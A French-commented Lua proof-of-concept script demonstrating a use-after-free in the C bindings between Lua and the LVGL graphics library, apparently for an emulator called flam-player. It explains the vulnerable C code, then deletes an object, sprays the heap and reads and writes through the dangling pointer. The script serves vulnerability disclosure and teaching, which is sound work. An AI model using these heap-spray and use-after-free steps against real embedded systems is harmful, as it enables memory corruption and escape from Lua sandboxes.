-- ============================================================================
--  POC : Use-After-Free dans les bindings LVGL/Lua
-- ============================================================================
--
--  CONTEXTE
--  --------
--  Ce script demontre une vulnerabilite de type "Use-After-Free" (CWE-416)
--  dans les bindings C qui relient l'API Lua a la librairie graphique LVGL.
--
--  Le probleme vient d'un decalage entre la duree de vie d'un objet cote C
--  (geree par LVGL) et sa reference cote Lua (geree par le garbage collector).
--
--  ANALOGIE SIMPLE
--  ---------------
--  Imaginez un hotel :
--    - Vous recevez la cle de la chambre 42 (= la reference Lua).
--    - L'hotel demolit la chambre 42 (= lv_obj_del en C).
--    - Mais personne ne vous reprend la cle.
--    - Vous retournez a la chambre 42 : le sol n'existe plus → vous tombez.
--
--  CODE C VULNERABLE  (lua_lv.h, lignes 94-97)
--  -------------------------------------------------
--    static inline lv_obj_t *lua_lv_check_obj(lua_State *L, int idx) {
--        lv_obj_t **ud = luaL_checkudata(L, idx, LV_MT_OBJ);
--        return *ud;   // ← retourne le pointeur MEME S'IL A ETE LIBERE
--    }
--
--  Et dans l_obj_del (lua_lv_obj.c, lignes 21-25) :
--    static int l_obj_del(lua_State *L) {
--        lv_obj_t *obj = lua_lv_check_obj(L, 1);
--        if (obj) lv_obj_del(obj);  // ← libere la memoire C...
--        return 0;                  // ← ...mais ne met PAS *ud = NULL
--    }
--
--  Resultat : apres del(), la variable Lua contient toujours un pointeur
--  vers une zone memoire qui a ete rendue au systeme. Toute utilisation
--  ulterieure est un "Use-After-Free".
--
--  IMPACT SECURITE
--  ---------------
--  Sur cet emulateur desktop, cela provoque un crash (SIGSEGV / exit 139).
--  Sur un systeme embarque avec une sandbox Lua (sans os.execute), un
--  attaquant pourrait exploiter ce bug pour :
--    1. Lire de la memoire arbitraire   (fuite d'information)
--    2. Ecrire dans de la memoire liberee (corruption du tas)
--    3. Detourner un pointeur de fonction (execution de code natif)
--
--  EXECUTION
--  ---------
--  Lancer avec :  ./flam-player.exe poc_use_after_free.lua
--  Le script va s'arreter au crash. Avec ASan, le rapport detaillera
--  exactement quel acces memoire est invalide.
--
-- ============================================================================

local function log(msg)
    print("[POC-UAF] " .. msg)
end

local function separator()
    print(string.rep("-", 70))
end

-- ============================================================================
--  ETAPE 1 : Creer un objet LVGL valide
-- ============================================================================
separator()
log("ETAPE 1 — Creation d'un bouton LVGL")
log("")
log("  Code Lua :  local btn = lv.btn.new()")
log("  Code C   :  lv_obj_create() alloue ~200 octets sur le tas (heap)")
log("              Le pointeur est stocke dans un 'userdata' Lua")
separator()

local btn = lv.btn.new()
lv.obj.set_size(btn, 100, 40)
lv.obj.set_pos(btn, 50, 50)

-- Ajouter un label pour visualiser l'objet
local label = lv.label.new(btn)
lv.label.set_text(label, "Cliquez-moi")

log("")
log("  Resultat  : btn est un userdata Lua valide")
log("  En memoire: btn.userdata --> [ lv_obj_t @ 0x???? ] (ALLOUE)")
log("  L'objet est visible a l'ecran.")
log("")

-- Prouver que l'objet fonctionne
local w = lv.obj.get_width(btn)
local h = lv.obj.get_height(btn)
log(string.format("  Verification : get_width=%d, get_height=%d  ✓ OK", w, h))
log("")

-- ============================================================================
--  ETAPE 2 : Supprimer l'objet cote C (mais PAS cote Lua)
-- ============================================================================
separator()
log("ETAPE 2 — Suppression de l'objet via lv.obj.del()")
log("")
log("  Code Lua :  lv.obj.del(btn)")
log("  Code C   :  lv_obj_del() libere la struct lv_obj_t et tous ses enfants")
log("              La memoire est rendue au gestionnaire de tas de LVGL")
log("")
log("  PROBLEME :  la fonction C ne fait PAS :  *ud = NULL")
log("              Donc la variable 'btn' en Lua contient toujours")
log("              l'ancien pointeur vers la zone LIBEREE.")
separator()

lv.obj.del(btn)

log("")
log("  Resultat  : la memoire C est liberee")
log("  En memoire: btn.userdata --> [ 0x???? ] (LIBERE / DANGLING POINTER)")
log("  L'objet a disparu de l'ecran.")
log("  Mais 'btn' existe encore en Lua — c'est le 'dangling pointer'.")
log("")

-- ============================================================================
--  ETAPE 3 : (Optionnel) Remplir le 'trou' avec de nouvelles donnees
-- ============================================================================
separator()
log("ETAPE 3 — Remplissage du 'trou' memoire (heap spray)")
log("")
log("  On cree plein de nouveaux objets pour que l'allocateur reutilise")
log("  la zone memoire qui appartenait a 'btn'.")
log("  Si ca marche, 'btn' pointe maintenant vers un AUTRE objet,")
log("  ou vers des donnees completement differentes.")
separator()

-- Creer des objets de taille similaire pour remplir le trou
local spray = {}
for i = 1, 30 do
    spray[i] = lv.obj.new()
    lv.obj.set_size(spray[i], 10, 10)
end

log("")
log(string.format("  %d objets crees pour remplir le tas.", #spray))
log("  L'ancienne zone de 'btn' est probablement reutilisee.")
log("")

-- ============================================================================
--  ETAPE 4 : Utiliser le pointeur invalide → USE-AFTER-FREE
-- ============================================================================
separator()
log("ETAPE 4 — Acces au pointeur invalide (Use-After-Free)")
log("")
log("  On va appeler lv.obj.get_width(btn) sur l'objet SUPPRIME.")
log("  Cote C, ca fait :  lv_obj_get_width( pointeur_invalide )")
log("")
log("  Scenarios possibles :")
log("    a) La memoire a ete reutilisee → lecture de donnees corrompues")
log("    b) La memoire a ete rendue a l'OS → CRASH (SIGSEGV)")
log("    c) Avec ASan active → rapport detaille de l'erreur")
log("")
log("  >>>  Tentative de lecture (get_width) sur objet supprime...")
separator()

-- LECTURE sur memoire liberee (Use-After-Free READ)
local ok, result = pcall(function()
    return lv.obj.get_width(btn)
end)

if ok then
    log("")
    log(string.format("  !! get_width a retourne %s (donnee CORROMPUE ou residuelle)", tostring(result)))
    log("  Le programme n'a pas crashe, mais la valeur lue est INVALIDE.")
    log("  C'est une FUITE D'INFORMATION : on lit la memoire d'un autre objet.")
    log("")
else
    log("")
    log("  !! Erreur Lua : " .. tostring(result))
    log("")
end

-- ============================================================================
--  ETAPE 5 : Ecriture sur memoire liberee (plus dangereux)
-- ============================================================================
separator()
log("ETAPE 5 — Ecriture sur le pointeur invalide")
log("")
log("  On va appeler lv.obj.set_size(btn, 999, 999) sur l'objet SUPPRIME.")
log("  Cote C, ca fait :  lv_obj_set_size( pointeur_invalide, 999, 999 )")
log("")
log("  C'est plus grave qu'une lecture :")
log("    - On ECRIT dans de la memoire qui appartient peut-etre")
log("      a un autre objet, a une structure interne, ou au systeme.")
log("    - Un attaquant peut s'en servir pour corrompre l'etat du programme.")
log("")
log("  >>>  Tentative d'ecriture (set_size) sur objet supprime...")
log("  >>>  Si le programme crashe ici, c'est le SIGSEGV attendu.")
separator()

-- ECRITURE sur memoire liberee (Use-After-Free WRITE) — provoque le crash
lv.obj.set_size(btn, 999, 999)

-- Si on arrive ici, la memoire a ete reutilisee sans crash
log("")
log("  !! set_size n'a pas crashe — la memoire a ete corrompue SILENCIEUSEMENT.")
log("  C'est le scenario le plus dangereux : pas de crash visible,")
log("  mais l'etat interne du programme est corrompu.")
log("")

-- ============================================================================
--  ETAPE 6 : Nettoyage
-- ============================================================================
separator()
log("ETAPE 6 — Nettoyage")
for i = 1, #spray do
    pcall(lv.obj.del, spray[i])
end
log("  Nettoyage termine.")
separator()

log("")
log("=== FIN DU POC ===")
log("Si vous lisez ceci, le programme n'a pas crashe.")
log("Mais la memoire a ete corrompue — le comportement est indefini.")
log("Avec AddressSanitizer (ASan), vous verriez un rapport d'erreur")
log("detaillant exactement quel octet a ete lu/ecrit apres liberation.")
log("")
log("Appuyez sur Ctrl+C ou fermez la fenetre pour quitter.")
